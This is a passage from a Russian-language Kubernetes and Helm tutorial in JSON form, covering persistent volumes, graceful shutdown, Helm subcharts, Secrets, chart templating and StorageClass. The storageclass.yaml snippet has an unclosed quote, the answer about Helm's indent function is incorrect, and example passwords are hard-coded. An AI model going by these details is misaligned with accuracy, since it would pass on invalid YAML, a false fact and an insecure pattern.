    "theory": "Контейнеры внутри Pod по умолчанию эфемерны: если контейнер падает или Pod перезапускается на другом узле, данные в корневой файловой системе теряются. Для постоянного хранения данных (Stateful workloads: базы данных, очереди сообщений, файловые хранилища) Kubernetes предоставляет двухуровневую абстракцию:\n1. **PersistentVolume (PV)** — физический или облачный ресурс хранения (EBS, Ceph, NFS, Local SSD), создаваемый кластерным администратором или динамическим провижинером (StorageClass). PV не привязан к конкретному namespace.\n2. **PersistentVolumeClaim (PVC)** — запрос пользователя на хранение с заданными параметрами: объем (`storage: 10Gi`), класс (`storageClassName`) и режим доступа (`accessModes`):\n   - `ReadWriteOnce (RWO)` — том монтируется на чтение и запись только одним узлом кластера (типично для блочных томов AWS EBS, GCE Persistent Disk).\n   - `ReadOnlyMany (ROX)` — том монтируется многими узлами только для чтения.\n   - `ReadWriteMany (RWX)` — том монтируется многими узлами на чтение и запись (файловые хранилища: NFS, AWS EFS, CephFS).\n   - `ReadWriteOncePod (RWOP)` — том монтируется строго одним Pod во всем кластере (доступно с K8s 1.22+ для CSI томов).\n3. **Reclaim Policy (Политика утилизации)**:\n   - `Retain` — при удалении PVC том PV сохраняется со всеми данными для ручного анализа.\n   - `Delete` — при удалении PVC нижележащий диск в облаке автоматически удаляется.",
    "step_by_step": "1. Создайте PVC с запросом 10Gi памяти и режимом `ReadWriteOnce`.\n2. В манифесте Deployment или StatefulSet подключите том через `volumes[].persistentVolumeClaim.claimName`.\n3. Примонтируйте том внутри контейнера через `volumeMounts[].mountPath: /data`.\n4. Напишите Go-микросервис, сохраняющий транзакционные логи в директорию `/data/transactions.log`.\n5. Протестируйте удаление и перезапуск Pod: данные сохраняются без потерь.",
    "code_blocks": [
      {
        "filename": "pvc.yaml",
        "lang": "yaml",
        "code": "apiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: app-data-pvc\n  namespace: default\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 10Gi\n  storageClassName: standard"
      },
      {
        "filename": "deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: data-logger\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: data-logger\n  template:\n    metadata:\n      labels:\n        app: data-logger\n    spec:\n      containers:\n        - name: logger\n          image: data-logger:v1.0.0\n          volumeMounts:\n            - name: storage\n              mountPath: /data\n      volumes:\n        - name: storage\n          persistentVolumeClaim:\n            claimName: app-data-pvc"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"time\"\n)\n\nfunc main() {\n\tfilePath := \"/data/transactions.log\"\n\tf, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)\n\tif err != nil {\n\t\tlog.Fatalf(\"Ошибка открытия файла на PV: %v\", err)\n\t}\n\tdefer f.Close()\n\n\tentry := fmt.Sprintf(\"[%s] Pod restart verified, persistent storage intact\\n\", time.Now().Format(time.RFC3339))\n\tif _, err := f.WriteString(entry); err != nil {\n\t\tlog.Fatalf(\"Ошибка записи в PV: %v\", err)\n\t}\n\n\tfmt.Println(\"Успешная запись транзакции в PersistentVolume\")\n}"
      }
    ],
    "under_the_hood": "Связывание (Binding) PVC с PV выполняется `pv-controller` внутри `kube-controller-manager`. Контроллер ищет свободный PV, соответствующий критериям (размер >= запрошенного, matching storageClassName и accessModes). После связывания статус PVC становится `Bound`. При планировании Pod узел вызывает `attach/detach controller` и CSI-плагин (Container Storage Interface). CSI-плагин выполняет системные вызовы `AttachDisk`, `Format` (mkfs.ext4/xfs) и `Mount` блочного устройства в путь `/var/lib/kubelet/pods/<pod-uid>/volumes/...`, после чего Linux mount namespace изолирует точку монтирования внутри контейнера.",
    "pitfalls": "1. Попытка смонтировать один и тот же EBS том (`ReadWriteOnce`) на два Pod, находящихся на РАЗНЫХ worker-нодах — второй Pod зависнет в статусе `ContainerCreating` с ошибкой `Multi-Attach error for volume`. Для многоузловой записи используйте NFS/EFS или переходите на StatefulSet с volumeClaimTemplates.\n2. Несоответствие StorageClass: если указан несуществующий класс или провайдер не поддерживает динамический провижининг, PVC бесконечно висит в статусе `Pending`.",
    "bigtech_interview": "**Вопрос с собеседования:** «Почему в большинстве production-кластеров для СУБД (PostgreSQL, MySQL, Kafka) используют StatefulSet с `volumeClaimTemplates`, а не Deployment с обычным PVC?»\n**Ответ:** Если создать Deployment с репликами `replicas: 3` и одним общим PVC, то либо тома с типом `ReadWriteOnce` не смогут примонтироваться к подам на других узлах, либо при томах `ReadWriteMany` все три реплики СУБД начнут одновременно писать в одни и те же бинарные файлы данных без координации на уровне дисковых блокировок, что приведет к мгновенному повреждению (corruption) БД. StatefulSet гарантирует, что каждая реплика (`pod-0`, `pod-1`, `pod-2`) получает свой собственный уникальный PVC и изолированный PV."
  },
  {
    "num": 82,
    "title": "Graceful Shutdown в Kubernetes: terminationGracePeriodSeconds и preStop hook",
    "task": "**[Каверзный кейс — Graceful Shutdown в K8s]**: Настрой в K8s `terminationGracePeriodSeconds: 30`. Когда ты удаляешь Pod, K8s отправляет `SIGTERM`. Убедись, что твое Go-приложение ловит сигнал, прекращает принимать новые запросы (K8s через `preStop` hook удаляет Pod из Endpoints/Service), дорабатывает текущие запросы и завершается, не дожидаясь `SIGKILL`.",
    "theory": "Жизненный цикл удаления Pod в Kubernetes асинхронен. При `kubectl delete pod` происходят параллельные процессы:\n1. `kube-apiserver` помечает Pod как `Terminating`.\n2. `endpoint-controller` удаляет IP пода из списка `Endpoints` сервиса. `kube-proxy` на всех узлах и Ingress-контроллеры обновляют правила `iptables`/`IPVS`/`nginx upstream`. Это занимает от 1 до 5 секунд из-за асинхронной природы распределенного кластера!\n3. Одновременно `kubelet` на узле запускает хук `preStop` (если задан) и затем шлет процессу в контейнере `SIGTERM`.\n4. Если приложение немедленно остановит HTTP-сервер при получении `SIGTERM`, клиенты, чьи запросы уже летят через Ingress или балансировщик, получат ошибки `502 Bad Gateway` или `Connection Refused`, так как сетевые правила еще не успели обновиться!\n5. **Решение проблемы нулевого даунтайма (Zero-Downtime):**\n   - Добавление `preStop: exec: command: [\"sleep\", \"5\"]` в спецификацию контейнера, чтобы дать сетевой инфраструктуре время удалить Pod из Endpoints.\n   - Корректная обработка `os.Signal` (`syscall.SIGINT`, `syscall.SIGTERM`) в Go через `signal.NotifyContext`.\n   - Вызов `server.Shutdown(ctx)` для завершения активных соединений и ожидания завершения фоновых задач перед выходом из `main`.",
    "step_by_step": "1. В `deployment.yaml` укажите `terminationGracePeriodSeconds: 30`.\n2. В секции `lifecycle` контейнера настройте `preStop` с задержкой 5 секунд.\n3. В Go-приложении настройте перехват `SIGTERM` через `signal.NotifyContext`.\n4. Запустите HTTP-сервер в отдельной горутине, а в главной ждите отмены контекста сигналом.\n5. Вызовите `srv.Shutdown(shutdownCtx)` с таймаутом завершения активных соединений.",
    "code_blocks": [
      {
        "filename": "deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: graceful-api\nspec:\n  replicas: 2\n  template:\n    spec:\n      terminationGracePeriodSeconds: 30\n      containers:\n        - name: app\n          image: graceful-api:v1.0.0\n          lifecycle:\n            preStop:\n              exec:\n                command: [\"/bin/sh\", \"-c\", \"sleep 5\"]\n          ports:\n            - containerPort: 8080"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"context\"\n\t\"errors\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n\t\"os/signal\"\n\t\"syscall\"\n\t\"time\"\n)\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/healthz\", func(w http.ResponseWriter, r *http.Request) {\n\t\tw.WriteHeader(http.StatusOK)\n\t\t_, _ = w.Write([]byte(\"OK\"))\n\t})\n\tmux.HandleFunc(\"/work\", func(w http.ResponseWriter, r *http.Request) {\n\t\ttime.Sleep(3 * time.Second) // Имитация обработки долгого запроса\n\t\tw.WriteHeader(http.StatusOK)\n\t\t_, _ = w.Write([]byte(\"Processed successfully\"))\n\t})\n\n\tserver := &http.Server{\n\t\tAddr:    \":8080\",\n\t\tHandler: mux,\n\t}\n\n\tctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)\n\tdefer stop()\n\n\tgo func() {\n\t\tlog.Printf(\"Сервер запущен на порту :8080\")\n\t\tif err := server.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {\n\t\t\tlog.Fatalf(\"Ошибка сервера: %v\", err)\n\t\t}\n\t}()\n\n\t<-ctx.Done()\n\tlog.Println(\"Получен сигнал завершения. Запуск graceful shutdown...\")\n\n\tshutdownCtx, cancel := context.WithTimeout(context.Background(), 20*time.Second)\n\tdefer cancel()\n\n\tif err := server.Shutdown(shutdownCtx); err != nil {\n\t\tlog.Printf(\"Принудительное завершение: %v\", err)\n\t} else {\n\t\tlog.Println(\"Все активные HTTP-соединения успешно закрыты\")\n\t}\n}"
      }
    ],
    "under_the_hood": "Когда `kubelet` получает команду `StopPod`, он сначала проверяет наличие хука `preStop`. Выполнение `preStop` является блокирующим: сигнал `SIGTERM` процессу контейнера НЕ отправляется, пока хук не завершится (или не истечет `terminationGracePeriodSeconds`). За время выполнения `sleep 5` в хуке `preStop`:\n1. `EndpointSlice Controller` обновляет ресурс `EndpointSlice`.\n2. `kube-proxy` на всех нодах получает watch-событие и пересчитывает iptables chains (правила `KUBE-SVC-*`), исключая IP удаляемого пода.\n3. Новые сетевые пакеты больше не направляются на узел пода.\nПосле завершения `preStop` рантайм (containerd/CRI-O) шлет `SIGTERM` PID 1 контейнера. Сервер закрывает слушающий сокет и ожидает завершения активных соединений до истечения таймаута.",
    "pitfalls": "1. Запуск приложения через shell-обертку: `CMD [\"sh\", \"-c\", \"my-app\"]` делает `sh` процессом PID 1. Большинство оболочек (dash, ash, bash) по умолчанию НЕ пересылают сигналы дочерним процессам! В результате `SIGTERM` теряется, приложение работает вплоть до `SIGKILL`, обрывая запросы клиентов с 502/504 ошибками. Всегда используйте exec-форму `ENTRYPOINT [\"/app/my-app\"]` или `exec my-app` в shell-скриптах.\n2. Недостаточный `terminationGracePeriodSeconds`: если период равен 10 секундам, а `preStop` длится 5 секунд и завершение запросов 8 секунд (сумма 13 сек), kubelet принудительно убьет Pod через `SIGKILL` ровно на 10-й секунде.",
    "bigtech_interview": "**Вопрос с собеседования:** «Почему в продакшене при деплое новой версии микросервиса клиенты периодически получают ошибки 502 Bad Gateway, несмотря на то, что в коде реализован `server.Shutdown(ctx)`?»\n**Ответ:** Причина в рассинхронизации control-plane K8s. Когда контейнер получает `SIGTERM`, он сразу перестает принимать новые TCP-коннекты (`server.Close()` слушающего сокета). Но `kube-proxy` и ingress-контроллер обновляют правила маршрутизации с задержкой в несколько секунд. Запросы, отправленные в этот промежуток, всё еще летят на старый Pod и получают TCP RST (`connection refused`). Решение — настроить `lifecycle.preStop: exec: command: [\"sleep\", \"5..10\"]` и убедиться, что `terminationGracePeriodSeconds` покрывает задержку preStop + время обработки самых долгих запросов."
  },
  {
    "num": 83,
    "title": "Helm: управление зависимостями и композитные чарты (Subcharts)",
    "task": "Напиши **Helm Chart с dependencies**: `dependencies: - name: postgresql, version: 12.x.x, repository: https://charts.bitnami.com/bitnami`. `helm dependency update`. Покажи composite applications.",
    "theory": "В микросервисной архитектуре приложения часто требуют готовых инфраструктурных компонентов: баз данных (PostgreSQL, MySQL), кэшей (Redis) или брокеров сообщений (RabbitMQ, Kafka). Вместо ручного копирования манифестов Helm предлагает механизм зависимостей (**Chart Dependencies / Subcharts**):\n1. **Секция `dependencies` в `Chart.yaml`**: объявляет имя, версию и репозиторий дочернего чарта.\n2. **Команда `helm dependency update` (или `build`)**: скачивает архивы чартов (`.tgz`) в поддиректорию `charts/` и формирует lock-файл `Chart.lock` с контрольными суммами SHA-256 для воспроизводимости сборки.\n3. **Переопределение конфигурации (Values Overriding)**: родительский чарт (`myapp`) может переопределять параметры дочернего чарта в своем `values.yaml`, обращаясь к ним по ключу, совпадающему с именем зависимости (например, `postgresql.auth.database: myapp_db`).\n4. **Условное включение (Conditions / Tags)**: зависимость можно сделать опциональной с помощью директивы `condition: postgresql.enabled`, что полезно для отключения встроенной БД в production-окружениях с облачным управляемым RDS/Managed PostgreSQL.",
    "step_by_step": "1. Создайте `Chart.yaml` с описанием приложения и секцией `dependencies` с чартом Bitnami PostgreSQL.\n2. В `values.yaml` настройте параметры своего сервиса и переопределите значения для `postgresql`.\n3. Выполните `helm dependency update` для загрузки tar-архива PostgreSQL в директорию `charts/`.\n4. Сгенерируйте итоговые манифесты командой `helm template .` и убедитесь в наличии объектов PostgreSQL.",
    "code_blocks": [
      {
        "filename": "Chart.yaml",
        "lang": "yaml",
        "code": "apiVersion: v2\nname: myapp\ndescription: Composite Helm Chart with PostgreSQL dependency\nversion: 1.0.0\nappVersion: \"1.0.0\"\n\ndependencies:\n  - name: postgresql\n    version: \"12.5.6\"\n    repository: \"https://charts.bitnami.com/bitnami\"\n    condition: postgresql.enabled"
      },
      {
        "filename": "values.yaml",
        "lang": "yaml",
        "code": "replicaCount: 2\n\nimage:\n  repository: myapp-service\n  tag: \"1.0.0\"\n  pullPolicy: IfNotPresent\n\nservice:\n  type: ClusterIP\n  port: 8080\n\n# Переопределение значений зависимого чарта postgresql\npostgresql:\n  enabled: true\n  auth:\n    username: myapp_user\n    password: SecretPassword123!\n    database: myapp_db\n  primary:\n    persistence:\n      size: 10Gi"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Скачивание зависимостей и генерация Chart.lock\nhelm dependency update ./myapp\n\n# Проверка локального рендеринга композитного чарта\nhelm template myapp ./myapp > rendered_manifests.yaml\n\n# Установка в кластер Kubernetes\nhelm install my-release ./myapp -n default"
      }
    ],
    "under_the_hood": "При выполнении `helm dependency update` Helm обращается к указанному HTTP-репозиторию, парсит `index.yaml`, находит нужную semver-версию архива, загружает его в директорию `charts/` и записывает SHA-256 хэш в `Chart.lock`. Во время рендеринга шаблонов (`helm template` / `helm install`) движок рендеринга обходит дерево чартов снизу вверх. Значения из корневого `values.yaml` с префиксом `postgresql.*` мерджатся поверх дефолтных значений subchart `postgresql/values.yaml`.",
    "pitfalls": "1. Отсутствие `Chart.lock` в Git-репозитории: если lock-файл не зафиксирован в системе контроля версий, сборка в CI/CD конвейере может непреднамеренно подтянуть новую minor/patch версию зависимости с критическими изменениями.\n2. Использование subchart-баз данных в HighLoad Production: чарты вроде Bitnami PostgreSQL в K8s отлично подходят для локальной разработки (Minikube/Kind) и тестовых контуров, но в продакшене промышленного масштаба обычно используют Cloud Managed DB (RDS, Cloud SQL) или специализированные CloudNative-операторы (Zalando Postgres Operator, CloudNativePG).",
    "bigtech_interview": "**Вопрос с собеседования:** «Как в Helm организовать деплой приложения так, чтобы на dev-стенде автоматически поднимался встроенный Redis из subchart, а на production использовался внешний кластер Redis (например, в AWS ElastiCache)?»\n**Ответ:** В `Chart.yaml` для зависимости `redis` указывается директива `condition: redis.enabled`. В общем `values.yaml` по умолчанию ставится `redis.enabled: true`. В `values-production.yaml` задается `redis.enabled: false`, а в конфигурации приложения прописывается внешний хост `redisHost: \"elasticache.cluster.internal\"`."
  },
  {
    "num": 84,
    "title": "Секреты (Secrets) в Kubernetes: base64, stringData и безопасное подключение",
    "task": "**Секреты (Secrets)**: Создай `secret.yaml` для хранения пароля от БД (значения в yaml должны быть в base64). Прокинь его в под аналогично ConfigMap. Никогда не коммить секреты в Git в открытом виде!",
    "theory": "**Secret** — объект Kubernetes, предназначенный для конфиденциальной информации (пароли, API-ключи, TLS-сертификаты, токены доступа):\n1. **Формат данных:**\n   - Поле `data`: ключи хранят значения, закодированные в **Base64** (например, `echo -n \"my-pass\" | base64`). Base64 — это НЕ шифрование, а всего лишь метод сериализации бинарных данных в ASCII!\n   - Поле `stringData`: позволяет писать значения открытым текстом в манифесте; при отправке в apiserver K8s сам перекодирует их в Base64.\n2. **Способы передачи секрета в контейнер:**\n   - Через переменные окружения (`env[].valueFrom.secretKeyRef` или `envFrom[].secretRef`).\n   - Через монтирование тома (`volumes[].secret.secretName`), где каждый ключ секрета становится отдельным файлом внутри директории.\n3. **Безопасность:**\n   - По умолчанию в K8s секреты хранятся в `etcd` в открытом (Base64) виде. В production обязательно включается **EncryptionConfiguration** (шифрование etcd ключами KMS/AES-CBC).\n   - Для хранения секретов в Git применяются решения GitOps: **Mozilla SOPS**, **Sealed Secrets** или **External Secrets Operator (ESO)** с интеграцией в HashiCorp Vault / AWS Secrets Manager.",
    "step_by_step": "1. Закодируйте пароль базы данных в формат base64: `echo -n \"SuperP@ssw0rd!\" | base64`.\n2. Создайте манифест `secret.yaml` с типом `Opaque`.\n3. В манифесте `deployment.yaml` прокиньте секрет в переменную окружения `DB_PASSWORD`.\n4. В коде на Go прочитайте переменную через `os.Getenv(\"DB_PASSWORD\")`.\n5. Убедитесь, что `secret.yaml` добавлен в `.gitignore` во избежание утечки в Git.",
    "code_blocks": [
      {
        "filename": "secret.yaml",
        "lang": "yaml",
        "code": "apiVersion: v1\nkind: Secret\nmetadata:\n  name: db-credentials\n  namespace: default\ntype: Opaque\ndata:\n  # Значение \"SuperP@ssw0rd!\" в base64: U3VwZXJQQHNzdzByZCE=\n  DB_PASSWORD: U3VwZXJQQHNzdzByZCE=\nstringData:\n  DB_USER: db_admin"
      },
      {
        "filename": "deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: secured-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: secured-api\n  template:\n    metadata:\n      labels:\n        app: secured-api\n    spec:\n      containers:\n        - name: app\n          image: secured-api:v1.0.0\n          env:\n            - name: DB_PASS\n              valueFrom:\n                secretKeyRef:\n                  name: db-credentials\n                  key: DB_PASSWORD\n            - name: DB_USER\n              valueFrom:\n                secretKeyRef:\n                  name: db-credentials\n                  key: DB_USER"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc main() {\n\tdbUser := os.Getenv(\"DB_USER\")\n\tdbPass := os.Getenv(\"DB_PASS\")\n\n\tif dbUser == \"\" || dbPass == \"\" {\n\t\tlog.Fatal(\"Критические учетные данные БД отсутствуют в переменных окружения!\")\n\t}\n\n\t// Никогда не логируйте сам пароль в консоль!\n\tfmt.Printf(\"Подключение к БД инициализировано для пользователя: %s (длина пароля: %d симв.)\\n\",\n\t\tdbUser, len(dbPass))\n}"
      }
    ],
    "under_the_hood": "Когда Pod со ссылкой на Secret запускается на worker-ноде, `kubelet` запрашивает Secret у `kube-apiserver` через свой ограниченный Node Authorizer. Если Secret монтируется как том, kubelet создает в оперативной памяти тома `tmpfs` (RAM-диск по пути `/var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~secret/<name>`) файлы для каждого ключа. Это гарантирует, что конфиденциальные данные не записываются на физический SSD/HDD диск узла.",
    "pitfalls": "1. Коммит манифестов с Base64 в публичный или приватный Git: Base64 раскодируется за одну секунду (`base64 -d`), что приводит к мгновенной компрометации паролей.\n2. Использование `env` для передачи сверхчувствительных токенов: переменные окружения могут случайно утечь в логи при сбоях (panic stack trace) или быть прочитаны любым вредоносным процессом внутри контейнера через `/proc/1/environ`. Монтирование тома с Secret более безопасно.",
    "bigtech_interview": "**Вопрос с собеседования:** «Является ли нативный Kubernetes Secret безопасным хранилищем секретов из коробки?»\n**Ответ:** Нет, из коробки стандартный K8s Secret не шифруется: значения хранятся в `etcd` в открытом кодировании Base64, доступ к etcd означает полную компрометацию всех секретов кластера. Для соответствия требованиям безопасности (PCI DSS, ISO 27001) необходимо: 1) Включить KMS Encryption Provider в `kube-apiserver`; 2) Настроить строгий RBAC на чтение Secret; 3) Использовать внешние менеджеры секретов (HashiCorp Vault, AWS Secrets Manager) с синхронизацией через External Secrets Operator."
  },
  {
    "num": 85,
    "title": "Параметризация Helm-чарта: образ, реплики, ресурсы и Ingress",
    "task": "Напишите Helm-чарт для вашего приложения с параметризацией образа, реплик, ресурсов и ingress.",
    "theory": "Главная мощь Helm заключается в шаблонизации (Go templating) стандартных манифестов Kubernetes. Вместо дублирования десятков одинаковых YAML-файлов для Dev, Staging и Production создается единый параметризованный чарт:\n1. **`values.yaml`**: содержит значения по умолчанию (разумные defaults для локальной разработки).\n2. **Встроенные объекты и переменные**:\n   - `.Values` — доступ к параметрам из `values.yaml` или переопределениям (`--set`, `-f`).\n   - `.Release.Name`, `.Release.Namespace` — системная метаинформация о текущем релизе.\n   - `.Chart.Name`, `.Chart.Version` — параметры чарта.\n3. **Шаблоны (`templates/`)**:\n   - `deployment.yaml` — параметризует число реплик `{{ .Values.replicaCount }}`, репозиторий и тег образа `{{ .Values.image.repository }}:{{ .Values.image.tag | default .Chart.AppVersion }}`, запросы и лимиты ресурсов `{{ toYaml .Values.resources | nindent 12 }}`.\n   - `ingress.yaml` — условно создается с помощью директивы `{{- if .Values.ingress.enabled }}`.",
    "step_by_step": "1. Создайте структуру файлов чарта `helm-demo/`.\n2. Опишите параметры в `values.yaml` (реплики, тег образа, CPU/RAM лимиты, флаг ingress).\n3. Создайте `templates/deployment.yaml` с функциями `toYaml` и `nindent`.\n4. Создайте `templates/ingress.yaml` с проверкой условия `if .Values.ingress.enabled`.\n5. Проверьте валидность рендеринга командой `helm lint .` и `helm template .`.",
    "code_blocks": [
      {
        "filename": "values.yaml",
        "lang": "yaml",
        "code": "replicaCount: 3\n\nimage:\n  repository: my-org/web-service\n  tag: \"1.2.0\"\n  pullPolicy: IfNotPresent\n\nresources:\n  limits:\n    cpu: 500m\n    memory: 512Mi\n  requests:\n    cpu: 100m\n    memory: 128Mi\n\ningress:\n  enabled: true\n  className: nginx\n  hosts:\n    - host: api.example.com\n      paths:\n        - path: /\n          pathType: Prefix"
      },
      {
        "filename": "templates/deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: {{ .Release.Name }}-app\n  labels:\n    app: {{ .Release.Name }}\nspec:\n  replicas: {{ .Values.replicaCount }}\n  selector:\n    matchLabels:\n      app: {{ .Release.Name }}\n  template:\n    metadata:\n      labels:\n        app: {{ .Release.Name }}\n    spec:\n      containers:\n        - name: app\n          image: \"{{ .Values.image.repository }}:{{ .Values.image.tag }}\"\n          imagePullPolicy: {{ .Values.image.pullPolicy }}\n          ports:\n            - containerPort: 8080\n          resources:\n            {{- toYaml .Values.resources | nindent 12 }}"
      },
      {
        "filename": "templates/ingress.yaml",
        "lang": "yaml",
        "code": "{{- if .Values.ingress.enabled -}}\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: {{ .Release.Name }}-ingress\nspec:\n  ingressClassName: {{ .Values.ingress.className }}\n  rules:\n    {{- range .Values.ingress.hosts }}\n    - host: {{ .host | quote }}\n      http:\n        paths:\n          {{- range .paths }}\n          - path: {{ .path }}\n            pathType: {{ .pathType }}\n            backend:\n              service:\n                name: {{ $.Release.Name }}-svc\n                port:\n                  number: 8080\n          {{- end }}\n    {{- end }}\n{{- end }}"
      }
    ],
    "under_the_hood": "Helm парсит шаблоны с помощью стандартного Go-пакета `text/template`, расширенного библиотекой функций **Sprig** (более 100 вспомогательных функций: `toYaml`, `nindent`, `quote`, `default`, `b64enc` и др.). Вызов `toYaml .Values.resources | nindent 12` сначала сериализует Go-структуру словаря в валидный YAML-текст, а пайплайн `nindent 12` сдвигает каждую строку полученного YAML на 12 пробелов вправо с новой строки, обеспечивая строгое соблюдение отступов формата YAML.",
    "pitfalls": "1. Ошибки отступов (Indentation errors): пропуск функции `nindent` или указание неверного числа пробелов ломает итоговый YAML-манифест, приводя к ошибке `error converting YAML to JSON`.\n2. Забытый знак доллара `$` при обращении к глобальному контексту внутри цикла `range`: внутри `{{- range .Values.ingress.hosts }}` точка `.` ссылается на элемент итерации (хост), поэтому обращение к имени релиза требует префикса `$.Release.Name`.",
    "bigtech_interview": "**Вопрос с собеседования:** «В чем разница между функциями `indent` и `nindent` в Helm-шаблонах?»\n**Ответ:** Функция `indent N` добавляет N пробелов перед каждой строкой входного текста, кроме первой. Функция `nindent N` предварительно вставляет символ перевода строки `\\n`, а затем добавляет N пробелов перед ВСЕМИ строками, включая первую. В 99% случаев для сериализации блоков YAML (`toYaml`) используют именно `nindent`, чтобы блок начинался с новой строки на нужном уровне отступа."
  },
  {
    "num": 86,
    "title": "StorageClass и динамический провижининг томов (Dynamic Provisioning)",
    "task": "Настройте **StorageClass** с dynamic provisioning (например, AWS EBS, GCE PD).",
    "theory": "До появления **StorageClass** администраторам приходилось вручную создавать PV под каждый диск в облаке. **Dynamic Provisioning** полностью автоматизирует этот процесс:\n1. **StorageClass** определяет:\n   - `provisioner`: CSI-драйвер облачного провайдера (например, `ebs.csi.aws.com` для AWS EBS или `pd.csi.storage.gke.io` для Google Cloud PD).\n   - `parameters`: тип диска (например, `type: gp3`, `iops: \"3000\"`, `throughput: \"125\"`), шифрование (`encrypted: \"true\"`).\n   - `reclaimPolicy`: `Delete` (удалить диск при удалении PVC) или `Retain` (сохранить).\n   - `volumeBindingMode`:\n     - `Immediate` (по умолчанию) — том создается в облаке сразу при создании PVC, еще до того, как Pod назначен на узел. Это может вызвать проблему: том создастся в Availability Zone `us-east-1a`, а Pod запланируется в `us-east-1b`!\n     - `WaitForFirstConsumer` — создание тома откладывается до тех пор, пока `kube-scheduler` не выберет узел для пода с учетом зон доступности, сетевых задержек и ресурсов.",
    "step_by_step": "1. Создайте манифест `StorageClass` с провижинером AWS EBS CSI и `volumeBindingMode: WaitForFirstConsumer`.\n2. Создайте `PersistentVolumeClaim`, явно ссылающийся на созданный `storageClassName: fast-ebs-gp3`.\n3. Создайте Pod, монтирующий этот PVC.\n4. Убедитесь через `kubectl get pv`, что PersistentVolume был автоматически создан облачным драйвером.",
    "code_blocks": [
      {
        "filename": "storageclass.yaml",
        "lang": "yaml",
        "code": "apiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\n  name: fast-ebs-gp3\nprovisioner: ebs.csi.aws.com\nvolumeBindingMode: WaitForFirstConsumer\nallowVolumeExpansion: true\nreclaimPolicy: Delete\nparameters:\n  type: gp3\n  iops: \"3000\"\n  throughput: \"125\"\n  encrypted: \"true"
      },
      {
        "filename": "pvc.yaml",
        "lang": "yaml",
        "code": "apiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: db-data-claim\nspec:\n  accessModes:\n    - ReadWriteOnce\n  storageClassName: fast-ebs-gp3\n  resources:\n    requests:\n      storage: 20Gi"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Создание StorageClass и PVC\nkubectl apply -f storageclass.yaml\nkubectl apply -f pvc.yaml\n\n# Статус PVC будет Pending до запуска Pod благодаря WaitForFirstConsumer\nkubectl get pvc db-data-claim\n\n# Проверка созданного в облаке PV после запуска Pod\nkubectl get pv"
      }
    ],
    "under_the_hood": "Когда создается Pod, монтирующий PVC с `WaitForFirstConsumer`, планировщик `kube-scheduler` оценивает зоны доступности нод. Выбрав ноду (например, в зоне `ru-central1-a`), планировщик проставляет аннотацию `volume.kubernetes.io/selected-node` на PVC. Контроллер `csi-provisioner` перехватывает событие, вызывает метод `CreateVolume` у CSI-плагина с передачей зоны `ru-central1-a`. CSI-драйвер через Cloud API создает облачный диск именно в нужной зоне и генерирует объект `PersistentVolume`, автоматически связывая его с PVC.",
    "pitfalls": "1. Использование `volumeBindingMode: Immediate` в мультизональных кластерах: диск создается в случайной AZ, а Pod затем не может запуститься из-за нехватки ресурсов на нодах этой конкретной зоны (`volume node affinity conflict`). В продакшене всегда используйте `WaitForFirstConsumer`.\n2. Отсутствие флага `allowVolumeExpansion: true`: без этого флага невозможно динамически увеличить размер тома (`storage: 50Gi`) без полного пересоздания PVC и потери данных.",
    "bigtech_interview": "**Вопрос с собеседования:** «Что произойдет, если в PVC увеличить объем диска с 10Gi до 20Gi при включенном `allowVolumeExpansion: true`?»\n**Ответ:** Контроллер `csi-resizer` отправит запрос в Cloud API на расширение блочного устройства до 20Gi. После того как размер блочного тома изменится, `kubelet` при очередном обращении или монтировании выполнит команду расширения файловой системы (`resize2fs` для ext4 или `xfs_growfs` для XFS) прямо на лету без остановки и перезапуска работающего Pod."
  },
  {
    "num": 87,
    "title": "Хуки жизненного цикла в Helm (Helm Lifecycle Hooks)",
    "task": "Напиши **Helm Chart с hooks**: `annotations: \"helm.sh/hook\": pre-install, \"helm.sh/hook-weight\": \"1\"`. Job для database migrations перед установкой. `post-upgrade` для cache warming. Покажи lifecycle hooks.",
    "theory": "При стандартном `helm install` или `helm upgrade` все манифесты применяются практически одновременно. Однако в реальных приложениях требуется строгий порядок действий:\n- Запустить миграции схемы БД **до** того, как поднимутся новые реплики микросервиса.\n- Очистить или прогреть кэш **после** успешного обновления.\n- Отправить уведомление в Slack/Telegram об успешном или упавшем релизе.\n**Helm Hooks** позволяют вмешиваться в процесс релиза с помощью специальных аннотаций:\n1. `\"helm.sh/hook\"`:\n   - `pre-install` / `post-install` — выполняется до / после создания ресурсов первого релиза.\n   - `pre-upgrade` / `post-upgrade` — до / после обновления существующего релиза.\n   - `pre-delete` / `post-delete` — до / после удаления релиза.\n2. `\"helm.sh/hook-weight\"`: порядок выполнения хуков (хуки с меньшим весом выполняются первыми, например `\"-5\"` раньше `\"1\"`).\n3. `\"helm.sh/hook-delete-policy\"`: когда удалять объект хука:\n   - `hook-succeeded` — удалить Job при успешном завершении (exit code 